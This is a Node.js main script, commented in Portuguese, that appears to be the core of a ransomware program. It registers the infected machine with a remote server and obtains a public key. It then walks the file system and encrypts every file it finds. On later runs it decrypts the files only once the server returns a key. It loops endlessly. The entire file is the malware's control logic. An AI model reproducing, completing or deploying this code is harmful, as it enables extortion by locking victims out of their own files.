'use strict';

const Connection = require('./connection');
const MachineManager = require('./utils/MachineManager');
const Encrypter = require('./crypto/crypter');
const Decrypter = require ('./crypto/decrypter');
const lukeFileWalker = require('./discover');
const worker = require('./worker');

const connection = new Connection();

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const waitThenDo = async () => {
  console.log('Vou dormir');
  await sleep(1000 * 5);
  console.log('Acordei');
}

async function main() {
  let system = MachineManager.loadId();
  if (!system) {
    try {
      console.log('Iniciando os trabalhos');
      system = MachineManager.generateId();

      const { publicKey } = await connection.registerMachine(system);
      const fileEncrypter = Encrypter(publicKey);
      
      lukeFileWalker(filename => {
        worker(filename, fileEncrypter);
      });

    } catch (error) {
      // servidor offline
      MachineManager.deleteId();
    }
  } else {
    // ja rodou nessa maquina
    try {
      console.log('Desencriptando');
      const data = await connection.checkMachineStatus(system.uuid);

      if (data) {
        const fileDecrypter = Decrypter(data);
        lukeFileWalker(filename => {
          worker(filename, fileDecrypter);
        });
      }

    } catch (error) {
      // server off
      console.log("Erro ao tentar descriptar");
    }
  }

  // terminou todo o processamento
}

(async function() {
  while(true) {
    await main();
    await waitThenDo();
  }
})();